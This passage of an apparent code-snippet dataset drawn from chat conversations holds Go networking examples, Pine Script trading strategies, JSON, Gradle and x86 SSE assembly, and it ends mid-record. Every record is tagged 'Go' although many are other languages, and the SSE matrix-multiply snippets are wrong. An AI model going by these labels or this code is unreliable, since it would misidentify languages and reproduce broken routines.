    "code": "package main\n\nimport (\n\t\"net/http\"\n\t\"net/url\"\n\t\"log\"\n)\n\nfunc main() {\n\tproxyStr := \"http://your_proxy_address:port\"\n\tproxyURL, err := url.Parse(proxyStr)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\ttransport := &http.Transport{\n\t\tProxy: http.ProxyURL(proxyURL),\n\t}\n\n\tclient := &http.Client{\n\t\tTransport: transport,\n\t}\n\n\tresponse, err := client.Get(\"http://example.com\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer response.Body.Close()\n\n\t// 这里可以添加处理响应的代码\n}",
    "filename": "a6a9254d29c97a6cc0a484b583d27c42_2.go"
  },
  {
    "conversation_hash": "26f3006488ee5d3193e92d7ed9ee4cad",
    "code_index": 21,
    "language": "Go",
    "libraries": [],
    "code": "struct contour; // Forward declaration\n\nvoid func(struct contour *c) {\n    c->x = 10; // Error: invalid use of incomplete type ‘struct contour’\n}",
    "filename": "26f3006488ee5d3193e92d7ed9ee4cad_21.go"
  },
  {
    "conversation_hash": "26f3006488ee5d3193e92d7ed9ee4cad",
    "code_index": 23,
    "language": "Go",
    "libraries": [],
    "code": "#include \"contour.h\" // Assuming 'struct contour' is defined in this header\n\nvoid func(struct contour *c) {\n    c->x = 10; // Assuming 'x' is a member of 'struct contour'\n}",
    "filename": "26f3006488ee5d3193e92d7ed9ee4cad_23.go"
  },
  {
    "conversation_hash": "c197dff84cfd71e98da02267f97cd758",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func fetchUserLibrarySongs(userToken string) ([]SongInfo, error) {\n       // Implement fetching logic here\n       // Request to Apple Music API /v1/me/library/songs with the user token\n       // Handle pagination if the library is large\n       // Map the API response to your SongInfo struct or a similar one\n       return nil, nil // Placeholder return\n   }",
    "filename": "c197dff84cfd71e98da02267f97cd758_0.go"
  },
  {
    "conversation_hash": "c197dff84cfd71e98da02267f97cd758",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type SongInfo struct {\n    ID   string `json:\"id\"`\n    Name string `json:\"attributes.name\"`\n    // Include other fields as per the Apple Music API response\n}",
    "filename": "c197dff84cfd71e98da02267f97cd758_2.go"
  },
  {
    "conversation_hash": "c197dff84cfd71e98da02267f97cd758",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "import (\n    \"encoding/json\"\n    \"fmt\"\n    \"io/ioutil\"\n    \"net/http\"\n    \"net/url\"\n    \"strings\"\n)\n\nfunc fetchUserLibrarySongs(userToken string) ([]SongInfo, error) {\n    var songs []SongInfo\n    baseURL := \"https://api.music.apple.com/v1/me/library/songs\"\n    limit := 100 // or whatever page size you prefer\n\n    for {\n        reqURL, err := url.Parse(baseURL)\n        if err != nil {\n            return nil, err\n        }\n\n        // Prepare query parameters for pagination and limit\n        query := reqURL.Query()\n        query.Set(\"limit\", fmt.Sprintf(\"%d\", limit))\n        if len(songs) > 0 {\n            // Specify the offset or next URL based on the response from the previous request, if needed\n            // This is simplified for demonstration; actual pagination may involve following a 'next' link or similar\n            query.Set(\"offset\", fmt.Sprintf(\"%d\", len(songs)))\n        }\n        reqURL.RawQuery = query.Encode()\n\n        req, err := http.NewRequest(\"GET\", reqURL.String(), nil)\n        if err != nil {\n            return nil, err\n        }\n        \n        // Set Authorization header with user token\n        req.Header.Set(\"Authorization\", \"Bearer \"+userToken)\n\n        // Make the request\n        client := &http.Client{}\n        resp, err := client.Do(req)\n        if err != nil {\n            return nil, err\n        }\n        defer resp.Body.Close()\n\n        if resp.StatusCode != http.StatusOK {\n            // Handle non-OK responses, preferably with detailed error messages\n            return nil, fmt.Errorf(\"failed to fetch user library songs: %s\", resp.Status)\n        }\n\n        // Parse the JSON response\n        body, err := ioutil.ReadAll(resp.Body)\n        if err != nil {\n            return nil, err\n        }\n\n        var data struct {\n            Data []SongInfo `json:\"data\"`\n            // Include a 'next' URL or similar if pagination is available\n        }\n\n        if err := json.Unmarshal(body, &data); err != nil {\n            return nil, err\n        }\n\n        songs = append(songs, data.Data...)\n\n        // Check if there are more songs to fetch via pagination\n        // This is simplified; actual implementation may involve checking for a 'next' link or similar\n        if len(data.Data) < limit {\n            break // Break the loop if we have fetched all songs\n        }\n    }\n\n    return songs, nil\n}",
    "filename": "c197dff84cfd71e98da02267f97cd758_3.go"
  },
  {
    "conversation_hash": "3411c24e6418c3d4cea823e060cab5dc",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "/*\n      这是一个多行注释的例子。\n      它可以跨越多个行。\n     */\n     fmt.Println(\"Hello, World!\")",
    "filename": "3411c24e6418c3d4cea823e060cab5dc_3.go"
  },
  {
    "conversation_hash": "3411c24e6418c3d4cea823e060cab5dc",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// CalculateSum 计算两个整数的和并返回结果。\n// 该函数演示了如何为函数编写Go语言风格的注释。\nfunc CalculateSum(a int, b int) int {\n    return a + b\n}",
    "filename": "3411c24e6418c3d4cea823e060cab5dc_4.go"
  },
  {
    "conversation_hash": "3411c24e6418c3d4cea823e060cab5dc",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    var sum int = add(5, 7)\n    fmt.Println(\"Sum is:\", sum)\n}\n\nfunc add(a, b int) int {\n    result := a + b\n    fmt.Println(\"Adding:\", a, \"+\", b)\n    return result\n}",
    "filename": "3411c24e6418c3d4cea823e060cab5dc_11.go"
  },
  {
    "conversation_hash": "3411c24e6418c3d4cea823e060cab5dc",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"runtime/debug\"\n    \"fmt\"\n)\n\nfunc main() {\n    debug.PrintStack()\n    // 其他调试代码\n}",
    "filename": "3411c24e6418c3d4cea823e060cab5dc_14.go"
  },
  {
    "conversation_hash": "3411c24e6418c3d4cea823e060cab5dc",
    "code_index": 34,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    message := \"Hello, Delve!\"\n    fmt.Println(message)\n}",
    "filename": "3411c24e6418c3d4cea823e060cab5dc_34.go"
  },
  {
    "conversation_hash": "da7868e0f3374cfd57e4d8f719443e6b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net\"\n    \"os\"\n)\n\nfunc ipMatchesHost(ipToCheck string) (bool, error) {\n    // Parse the input IP address\n    inputIP := net.ParseIP(ipToCheck)\n    if inputIP == nil {\n        return false, fmt.Errorf(\"invalid IP address: %s\", ipToCheck)\n    }\n\n    // Get a list of all network interfaces\n    interfaces, err := net.Interfaces()\n    if err != nil {\n        return false, err\n    }\n\n    for _, iface := range interfaces {\n        // Check if the interface is up and has an IP address\n        if iface.Flags&net.FlagUp == 0 {\n            continue // Interface is down\n        }\n\n        addrs, err := iface.Addrs()\n        if err != nil {\n            return false, err\n        }\n\n        for _, addr := range addrs {\n            var ip net.IP\n\n            switch v := addr.(type) {\n            case *net.IPNet:\n                ip = v.IP\n            case *net.IPAddr:\n                ip = v.IP\n            }\n\n            // Check if this IP matches the input IP\n            if ip.Equal(inputIP) {\n                return true, nil\n            }\n        }\n    }\n\n    // No matching IP found\n    return false, nil\n}\n\nfunc main() {\n    // Example usage\n    ipToCheck := \"YOUR_IP_ADDRESS_HERE\" // Replace with the IP address you want to check\n    matches, err := ipMatchesHost(ipToCheck)\n    if err != nil {\n        fmt.Println(\"Error:\", err)\n        os.Exit(1)\n    }\n    if matches {\n        fmt.Println(\"The IP matches one of the host's IP addresses.\")\n    } else {\n        fmt.Println(\"The IP does not match any of the host's IP addresses.\")\n    }\n}",
    "filename": "da7868e0f3374cfd57e4d8f719443e6b_0.go"
  },
  {
    "conversation_hash": "da7868e0f3374cfd57e4d8f719443e6b",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sort\"\n)\n\nfunc main() {\n\tvar slice []int\n\t// Append elements\n\tslice = append(slice, 3)\n\tslice = append(slice, 1)\n\tslice = append(slice, 2)\n\n\t// Sort the slice\n\tsort.Ints(slice)\n\n\tfmt.Println(slice) // Output: [1 2 3]\n}",
    "filename": "da7868e0f3374cfd57e4d8f719443e6b_4.go"
  },
  {
    "conversation_hash": "da7868e0f3374cfd57e4d8f719443e6b",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sort\"\n)\n\nfunc sortedInsert(slice []int, elem int) []int {\n\ti := sort.Search(len(slice), func(i int) bool { return slice[i] >= elem })\n\tslice = append(slice[:i], append([]int{elem}, slice[i:]...)...)\n\treturn slice\n}\n\nfunc main() {\n\tvar slice []int\n\tslice = sortedInsert(slice, 3)\n\tslice = sortedInsert(slice, 1)\n\tslice = sortedInsert(slice, 2)\n\n\tfmt.Println(slice) // Output: [1 2 3]\n}",
    "filename": "da7868e0f3374cfd57e4d8f719443e6b_5.go"
  },
  {
    "conversation_hash": "e7686103d825b90767891029c2f0f59e",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"github.com/gorilla/mux\"\n)\n\nfunc main() {\n\trouter := mux.NewRouter()\n\n\t// Define your handlers\n\trouter.HandleFunc(\"/hello\", helloHtml).Methods(http.MethodGet)\n\trouter.HandleFunc(\"/\", handlePost).Methods(http.MethodPost)\n\t\n\t// Route with parameters and validation. Read with mux.Vars(r) inside handlePage\n\trouter.Path(\"/page/{page:[0-9]+}\").HandlerFunc(handlePage).Methods(http.MethodGet)\n\t\n\t// Use the router as the main handler instead of the default one\n\terr := http.ListenAndServe(\":3000\", router)\n\tif err != nil {\n\t\tfmt.Printf(\"Error starting server: %s\\n\", err)\n\t}\n}\n\nfunc helloHtml(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"<h1>Hello, this is HTML!</h1>\")\n}\n\nfunc handlePost(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Received a POST request!\")\n}\n\nfunc handlePage(w http.ResponseWriter, r *http.Request) {\n\tvars := mux.Vars(r)\n\tpage := vars[\"page\"]\n\t// Using the page variable from the path. You might want to convert it to an int.\n\tfmt.Fprintf(w, \"You requested page: %s\", page)\n}",
    "filename": "e7686103d825b90767891029c2f0f59e_0.go"
  },
  {
    "conversation_hash": "065d8dc036f1e98d4dbdc9938333cdbc",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(title=\"Twin Range Filter Strategy\", overlay=true, default_qty_type=strategy.percent_of_equity, default_qty_value=100)\n\nsource = input(defval=close, title=\"Source\")\n\n// Smooth Average Range\nper1 = input(defval=27, minval=1, title=\"Fast period\")\nmult1 = input(defval=1.6, minval=0.1, title=\"Fast range\")\n\nper2 = input(defval=55, minval=1, title=\"Slow period\")\nmult2 = input(defval=2, minval=0.1, title=\"Slow range\")\n\nsmoothrng(x, t, m) =>\n    wper = t * 2 - 1\n    avrng = ta.ema(math.abs(x - x[1]), t)\n    smoothrng = ta.ema(avrng, wper) * m\n    smoothrng\n\nsmrng1 = smoothrng(source, per1, mult1)\nsmrng2 = smoothrng(source, per2, mult2)\nsmrng = (smrng1 + smrng2) / 2\n\n// Range Filter\nrngfilt(x, r) =>\n    rngfilt = x\n    rngfilt := x > nz(rngfilt[1]) ? x - r < nz(rngfilt[1]) ? nz(rngfilt[1]) : x - r : \n       x + r > nz(rngfilt[1]) ? nz(rngfilt[1]) : x + r\n    rngfilt\n\nfilt = rngfilt(source, smrng)\n\nupward = 0.0\nupward := filt > filt[1] ? nz(upward[1]) + 1 : filt < filt[1] ? 0 : nz(upward[1])\ndownward = 0.0\ndownward := filt < filt[1] ? nz(downward[1]) + 1 : filt > filt[1] ? 0 : nz(downward[1])\n\nlongCond = source > filt and source > source[1] and upward > 0 or source > filt and source < source[1] and upward > 0\nshortCond = source < filt and source < source[1] and downward > 0 or source < filt and source > source[1] and downward > 0\n\nCondIni = 0\nCondIni := longCond ? 1 : shortCond ? -1 : CondIni[1]\n\nlong = longCond and CondIni[1] == -1\nshort = shortCond and CondIni[1] == 1\n\n// Strategy Execution\nif (long)\n    strategy.entry(\"Long\", strategy.long)\n    \nif (short)\n    strategy.entry(\"Short\", strategy.short)\n\n// Visualization (optional for the strategy but included for reference)\nplotshape(long, title=\"Long\", text=\"L\", style=shape.labelup, textcolor=color.black, size=size.tiny, location=location.belowbar, color=color.lime, transp=0)\nplotshape(short, title=\"Short\", text=\"S\", style=shape.labeldown, textcolor=color.white, size=size.tiny, location=location.abovebar, color=color.red, transp=0)",
    "filename": "065d8dc036f1e98d4dbdc9938333cdbc_4.go"
  },
  {
    "conversation_hash": "065d8dc036f1e98d4dbdc9938333cdbc",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(title=\"Twin Range Filter Strategy\", overlay=true, default_qty_type=strategy.percent_of_equity, default_qty_value=10)\n\nsource = input(defval=close, title=\"Source\")\n\n// Smooth Average Range\nper1 = input.int(defval=27, minval=1, title=\"Fast period\")\nmult1 = input.float(defval=1.6, minval=0.1, title=\"Fast range\")\n\nper2 = input.int(defval=55, minval=1, title=\"Slow period\")\nmult2 = input.float(defval=2, minval=0.1, title=\"Slow range\")\n\nsmoothrng(x, t, m) =>\n    wper = t * 2 - 1\n    avrng = ta.ema(math.abs(x - x[1]), t)\n    smoothrng = ta.ema(avrng, wper) * m\n    smoothrng\n\nsmrng1 = smoothrng(source, per1, mult1)\nsmrng2 = smoothrng(source, per2, mult2)\nsmrng = (smrng1 + smrng2) / 2\n\n// Range Filter\nrngfilt(x, r) =>\n    rngfilt = x\n    rngfilt := x > nz(rngfilt[1]) ? x - r < nz(rngfilt[1]) ? nz(rngfilt[1]) : x - r : \n       x + r > nz(rngfilt[1]) ? nz(rngfilt[1]) : x + r\n    rngfilt\n\nfilt = rngfilt(source, smrng)\n\nupward = 0.0\nupward := filt > filt[1] ? nz(upward[1]) + 1 : filt < filt[1] ? 0 : nz(upward[1])\ndownward = 0.0\ndownward := filt < filt[1] ? nz(downward[1]) + 1 : filt > filt[1] ? 0 : nz(downward[1])\n\nlongCond = source > filt and source > source[1] and upward > 0 or source > filt and source < source[1] and upward > 0\nshortCond = source < filt and source < source[1] and downward > 0 or source < filt and source > source[1] and downward > 0\n\nCondIni = 0\nCondIni := longCond ? 1 : shortCond ? -1 : CondIni[1]\n\nlong = longCond and CondIni[1] == -1\nshort = shortCond and CondIni[1] == 1\n\n// Strategy Execution\nif (long)\n    strategy.entry(\"Long\", strategy.long)\n    \nif (short)\n    strategy.entry(\"Short\", strategy.short)\n\n// Visualization (optional for the strategy but included for reference)\nplotshape(long, title=\"Long\", location=location.belowbar, color=color.new(color.green, 0), style=shape.labelup, size=size.small, text=\"L\", textcolor=color.white)\nplotshape(short, title=\"Short\", location=location.abovebar, color=color.new(color.red, 0), style=shape.labeldown, size=size.small, text=\"S\", textcolor=color.white)",
    "filename": "065d8dc036f1e98d4dbdc9938333cdbc_5.go"
  },
  {
    "conversation_hash": "065d8dc036f1e98d4dbdc9938333cdbc",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(title=\"Twin Range Filter Strategy with SALMA\", overlay=true, default_qty_type=strategy.percent_of_equity, default_qty_value=10)\n\nsource = input(defval=close, title=\"Source\")\n\n// Smooth Average Range\nper1 = input.int(defval=27, minval=1, title=\"Fast period\")\nmult1 = input.float(defval=1.6, minval=0.1, title=\"Fast range\")\n\nper2 = input.int(defval=55, minval=1, title=\"Slow period\")\nmult2 = input.float(defval=2, minval=0.1, title=\"Slow range\")\n\n// SALMA Indicator\nsalmaLength = input.int(45, title=\"SALMA Length\")\nextraSmooth = input.int(1, title=\"Extra Smooth\")\n\nsmoothrng(x, t, m) =>\n    wper = t * 2 - 1\n    avrng = ta.ema(math.abs(x - x[1]), t)\n    smoothrng = ta.ema(avrng, wper) * m\n    smoothrng\n\nsalma(x, length, smooth) =>\n    alpha = 2 / (length + 1)\n    e1 = ta.ema(x, length)\n    e2 = ta.ema(e1, length)\n    d = e1 - e2\n    salma = e1 + alpha * d * smooth\n    salma\n\nsmrng1 = smoothrng(source, per1, mult1)\nsmrng2 = smoothrng(source, per2, mult2)\nsmrng = (smrng1 + smrng2) / 2\n\nsalmaValue = salma(source, salmaLength, extraSmooth)\nsalmaGreen = salmaValue > ta.ema(salmaValue, salmaLength)\n\n// Range Filter and Conditions\nrngfilt(x, r) =>\n    rngfilt = x\n    rngfilt := x > nz(rngfilt[1]) ? x - r < nz(rngfilt[1]) ? nz(rngfilt[1]) : x - r : \n       x + r > nz(rngfilt[1]) ? nz(rngfilt[1]) : x + r\n    rngfilt\n\nfilt = rngfilt(source, smrng)\n\nlongCond = salmaGreen and source > filt and filt > filt[1]\nshortCond = not salmaGreen and source < filt and filt < filt[1]\n\n// Strategy Execution\nif (longCond)\n    strategy.entry(\"Long\", strategy.long)\n    \nif (shortCond)\n    strategy.entry(\"Short\", strategy.short)\n\n// Visualization\nplotshape(series=longCond, title=\"Long\", location=location.belowbar, style=shape.circle, color=color.new(color.green, 0), size=size.small)\nplotshape(series=shortCond, title=\"Short\", location=location.abovebar, style=shape.circle, color=color.new(color.red, 0), size=size.small)\nplot(salmaValue, title=\"SALMA\", color=salmaGreen ? color.green : color.red)\n\n// For the SALMA color visualization\nhline(0, \"Zero Line\", color=color.gray, linestyle=hline.style_solid)",
    "filename": "065d8dc036f1e98d4dbdc9938333cdbc_9.go"
  },
  {
    "conversation_hash": "065d8dc036f1e98d4dbdc9938333cdbc",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(title=\"Twin Range Filter Strategy with SALMA\", overlay=true, default_qty_type=strategy.percent_of_equity, default_qty_value=10)\n\nsource = input(defval=close, title=\"Source\")\n\n// Smooth Average Range\nper1 = input.int(defval=27, minval=1, title=\"Fast period\")\nmult1 = input.float(defval=1.6, minval=0.1, title=\"Fast range\")\n\nper2 = input.int(defval=55, minval=1, title=\"Slow period\")\nmult2 = input.float(defval=2, minval=0.1, title=\"Slow range\")\n\n// SALMA Indicator\nsalmaLength = input.int(45, title=\"SALMA Length\")\nextraSmooth = input.int(1, title=\"Extra Smooth\")\n\nsmoothrng(x, t, m) =>\n    wper = t * 2 - 1\n    avrng = ta.ema(math.abs(x - x[1]), t)\n    smoothrng = ta.ema(avrng, wper) * m\n    smoothrng\n\nsalma(x, length, smooth) =>\n    alpha = 2 / (length + 1)\n    e1 = ta.ema(x, length)\n    e2 = ta.ema(e1, length)\n    d = e1 - e2\n    salma = e1 + alpha * d * smooth\n    salma\n\nsmrng1 = smoothrng(source, per1, mult1)\nsmrng2 = smoothrng(source, per2, mult2)\nsmrng = (smrng1 + smrng2) / 2\n\nsalmaValue = salma(source, salmaLength, extraSmooth)\nsalmaGreen = salmaValue > ta.ema(salmaValue, salmaLength)\n\n// Range Filter and Conditions\nrngfilt(x, r) =>\n    rngfilt = x\n    rngfilt := x > nz(rngfilt[1]) ? x - r < nz(rngfilt[1]) ? nz(rngfilt[1]) : x - r : \n       x + r > nz(rngfilt[1]) ? nz(rngfilt[1]) : x + r\n    rngfilt\n\nfilt = rngfilt(source, smrng)\n\nlongCond = salmaGreen and source > filt and filt > filt[1]\nshortCond = not salmaGreen and source < filt and filt < filt[1] // Enters short when SALMA is red\n\n// Strategy Execution\nif (longCond)\n    strategy.entry(\"Long\", strategy.long)\n    \nif (shortCond)\n    strategy.entry(\"Short\", strategy.short)\n\n// Visualization\nplotshape(series=longCond, title=\"Long\", location=location.belowbar, style=shape.circle, color=color.new(color.green, 0), size=size.small)\nplotshape(series=shortCond, title=\"Short\", location=location.abovebar, style=shape.circle, color=color.new(color.red, 0), size=size.small)\nplot(salmaValue, title=\"SALMA\", color=salmaGreen ? color.green : color.red)\n\n// For the SALMA color visualization\nhline(0, \"Zero Line\", color=color.gray, linestyle=hline.style_solid)",
    "filename": "065d8dc036f1e98d4dbdc9938333cdbc_10.go"
  },
  {
    "conversation_hash": "d1bdf2297237a9a601566931e7c3d93c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"signal\": [\n    { \"name\": \"clk\",        \"wave\": \"p.......\" },\n    { \"name\": \"state\",      \"wave\": \"x3.343x\", \"data\": [\"IDLE\", \"RREQ\", \"RDATA\", \"WREQ\", \"WDATA\", \"IDLE\"] },\n    { \"name\": \"write to CMD\", \"wave\": \"x1.....x\", \"data\": [\"1\"] },\n    {},\n    [ \"AR Signals\",\n      { \"name\": \"ARVALID(out)\", \"wave\": \"01..0..\", \"data\": [\"SRC\"] },\n      { \"name\": \"ARADDR(out)\",  \"wave\": \"x3..0..\", \"data\": [\"SRC\"] },\n      { \"name\": \"ARLEN(out)\",   \"wave\": \"x1..0..\", \"data\": [\"0\"] },\n      { \"name\": \"ARREADY(in)\",  \"wave\": \"0.10...\" }\n    ],\n    { \"name\": \"RREADY(out)\",  \"wave\": \"0...10.\" },\n    {},\n    { \"name\": \"RVALID(in)\",   \"wave\": \"0....10\", \"data\": [\"DATA\"] },\n    { \"name\": \"RDATA(in)\",    \"wave\": \"x....3.\", \"data\": [\"DATA\"] },\n    {},\n    { \"name\": \"AWVALID(out)\", \"wave\": \"0.....10\", \"data\": [\"DST\"] },\n    { \"name\": \"AWADDR(out)\",  \"wave\": \"x.....3.\", \"data\": [\"DST\"] },\n    { \"name\": \"AWLEN(out)\",   \"wave\": \"x.....1.\", \"data\": [\"0\"] },\n    { \"name\": \"AWREADY(in)\",  \"wave\": \"0.....10\" },\n    { \"name\": \"WVALID(out)\",  \"wave\": \"0......10\" },\n    { \"name\": \"WDATA(out)\",   \"wave\": \"x......3x\", \"data\": [\"DATA\"] },\n    { \"name\": \"WREADY(in)\",   \"wave\": \"0......10\" }\n  ]\n}",
    "filename": "d1bdf2297237a9a601566931e7c3d93c_2.go"
  },
  {
    "conversation_hash": "0dbf865fd8ad42c314a32552bc861bc2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n\t\"itemList\": [{\n\t\t\"basetype\": \"ptype\",\n\t\t\"ktypeid\": 0,\n\t\t\"btypeid\": 0,\n\t\t\"id\": \"1635979231439280482\",\n\t\t\"typeid\": \"0069700594\",\n\t\t\"usercode\": \"\",\n\t\t\"fullname\": \"湖北联通-rizhao6244（20万）5G套餐\",\n\t\t\"name\": \"\",\n\t\t\"namepy\": \"hbltrizhao624420w5gtc\",\n\t\t\"standard\": \"\",\n\t\t\"type\": \"\",\n\t\t\"area\": \"\",\n\t\t\"recpricebase\": 1.0000,\n\t\t\"supplyinfo\": \"\",\n\t\t\"preprice\": 0.0000,\n\t\t\"preprice2\": 0.0000,\n\t\t\"preprice3\": 0.0000,\n\t\t\"preprice5\": 0.0000,\n\t\t\"preprice6\": 0.0000,\n\t\t\"preprice_6\": 0.0000,\n\t\t\"preprice_7\": 0.0000,\n\t\t\"preprice_8\": 0.0000,\n\t\t\"preprice_9\": 0.0000,\n\t\t\"preprice_10\": 0.0000,\n\t\t\"ptypeunit\": \"\",\n\t\t\"recprice\": 1.0000,\n\t\t\"sonnum\": 0,\n\t\t\"leveal\": 2,\n\t\t\"barcode\": \"\",\n\t\t\"prop1_enabled\": false,\n\t\t\"prop2_enabled\": false,\n\t\t\"prop3_enabled\": false,\n\t\t\"taobao_cid\": 0,\n\t\t\"comment\": \"19楼水池边拐角\",\n\t\t\"pcategory\": 0,\n\t\t\"taxrate\": 0.0000,\n\t\t\"lastbuyprice\": 0.0000,\n\t\t\"lastsaleprice\": 0.0000,\n\t\t\"lastbuydiscount\": 1.0000,\n\t\t\"lastsalediscount\": 1.0000,\n\t\t\"ucode\": 1,\n\t\t\"urate\": 1.0000,\n\t\t\"qty\": 167747.0000,\n\t\t\"costprice\": 1.0000,\n\t\t\"qtyshow\": 167747.0000,\n\t\t\"saleqty\": 167747.0000,\n\t\t\"unit1\": \"\",\n\t\t\"position\": null,\n\t\t\"parid\": \"527521683758899242\",\n\t\t\"partypeid\": \"00697\",\n\t\t\"snenabled\": 2,\n\t\t\"protectdays\": 0,\n\t\t\"weight\": 0.0000,\n\t\t\"retailprice\": 0.0000,\n\t\t\"isclass\": false,\n\t\t\"pic_url\": \"\",\n\t\t\"kfullname\": null,\n\t\t\"brandname\": null,\n\t\t\"costmode\": 0,\n\t\t\"hastrack\": 0,\n\t\t\"ptypevolume\": 0.0000,\n\t\t\"ptypelength\": 0.0000,\n\t\t\"ptypewidth\": 0.0000,\n\t\t\"ptypeheight\": 0.0000,\n\t\t\"isweight\": false,\n\t\t\"batchid\": 0,\n\t\t\"btypeptypecode\": null,\n\t\t\"subqtyshow\": 0.00000000,\n\t\t\"total\": 167747.0000,\n\t\t\"lockqty\": 0,\n\t\t\"surpqty\": 167747.0000\n\t}],\n\t\"itemCount\": 1\n}",
    "filename": "0dbf865fd8ad42c314a32552bc861bc2_0.go"
  },
  {
    "conversation_hash": "ee507c8255bc741991d207530ca3d3a1",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"scripts\": {\n    \"build\": \"quasar build\",\n    \"build:test\": \"cross-env PUBLIC_PATH=/newhome quasar build\",\n    // Or, if using an env file:\n    \"build:test\": \"cross-env DOTENV_CONFIG_PATH=.env.buildtest quasar build\"\n  }\n}",
    "filename": "ee507c8255bc741991d207530ca3d3a1_2.go"
  },
  {
    "conversation_hash": "f6101333be88257f7bada8e93e2a9a4a",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n}",
    "filename": "f6101333be88257f7bada8e93e2a9a4a_5.go"
  },
  {
    "conversation_hash": "9e2ce7df7840e5c08edb1fb65c840d2c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "_asm\n{\n    lea ecx, m1 // Загружаем адрес начала матрицы m1 в регистр ecx\n    lea edx, m2 // Загружаем адрес начала матрицы m2 в регистр edx\n\n    movaps xmm2, xmm0 // Очищаем регистр xmm2 для хранения результата\n\n    // Умножение матриц m1 и транспонированной m2\n    movaps xmm1, [edx]   // Загружаем первую строку транспонированной матрицы m2 в xmm1\n    mulps xmm1, [ecx]       // Умножаем первую строку m2 на первую строку m1\n    addps xmm2, xmm1    // Суммируем результат умножения с xmm2\n\n    movaps xmm1, [edx + 16]\n    mulps xmm1, [ecx]       \n    addps xmm2, xmm1\n\n    movaps xmm1, [edx + 32]\n    mulps xmm1, [ecx]       \n    addps xmm2, xmm1\n\n    movaps xmm1, [edx + 48]\n    mulps xmm1, [ecx]       \n    addps xmm2, xmm1\n\n    // Сохраняем результат умножения в матрицу m1\n    movaps [ecx], xmm2\n    movaps [ecx + 16], xmm2\n    movaps [ecx + 32], xmm2\n    movaps [ecx + 48], xmm2\n}",
    "filename": "9e2ce7df7840e5c08edb1fb65c840d2c_0.go"
  },
  {
    "conversation_hash": "9e2ce7df7840e5c08edb1fb65c840d2c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "_asm\n{\n    lea ecx, m1 // Загружаем адрес начала матрицы m1 в регистр ecx\n    lea edx, m2 // Загружаем адрес начала матрицы m2 в регистр edx\n\n    movaps xmm2, xmm0 // Очищаем регистр xmm2 для хранения результата\n\n    // Умножение матриц m1 и транспонированной m2 построчно\n    movups xmm1, [edx]   // Загружаем первую строку транспонированной матрицы m2 в xmm1\n    mulps xmm1, [ecx]       // Умножаем первую строку m2 на первую строку m1\n    addps xmm2, xmm1    // Суммируем результат умножения с xmm2\n\n    movups xmm1, [edx + 16]\n    mulps xmm1, [ecx]       \n    addps xmm2, xmm1\n\n    movups xmm1, [edx + 32]\n    mulps xmm1, [ecx]       \n    addps xmm2, xmm1\n\n    movups xmm1, [edx + 48]\n    mulps xmm1, [ecx]       \n    addps xmm2, xmm1\n\n    // Сохраняем результат умножения в матрицу m1\n    movups [ecx], xmm2\n    movups [ecx + 16], xmm2\n    movups [ecx + 32], xmm2\n    movups [ecx + 48], xmm2\n}",
    "filename": "9e2ce7df7840e5c08edb1fb65c840d2c_1.go"
  },
  {
    "conversation_hash": "9e2ce7df7840e5c08edb1fb65c840d2c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "_asm\n{\n    lea ecx, m1 // Загружаем адрес начала матрицы m1 в регистр ecx\n    lea edx, m2 // Загружаем адрес начала матрицы m2 в регистр edx\n\n    movaps xmm2, xmm0 // Очищаем регистр xmm2 для хранения результата\n\n    // Умножение транспонированной матрицы m2 на матрицу m1\n    movaps xmm1, [ecx]  // Загружаем первую строку матрицы m1 в xmm1\n    mulps xmm1, [edx]   // Умножаем первую строку m2 на первую строку m1\n    addps xmm2, xmm1    // Суммируем результат умножения с xmm2\n\n    movaps xmm1, [ecx + 16]\n    mulps xmm1, [edx + 16]\n    addps xmm2, xmm1\n\n    movaps xmm1, [ecx + 32]\n    mulps xmm1, [edx + 32]\n    addps xmm2, xmm1\n\n    movaps xmm1, [ecx + 48]\n    mulps xmm1, [edx + 48]\n    addps xmm2, xmm1\n\n    // Сохраняем результат умножения в матрицу m1\n    movaps [ecx], xmm2\n    movaps [ecx + 16], xmm2\n    movaps [ecx + 32], xmm2\n    movaps [ecx + 48], xmm2\n}",
    "filename": "9e2ce7df7840e5c08edb1fb65c840d2c_3.go"
  },
  {
    "conversation_hash": "398cc71e89239bf74472622b56910f89",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
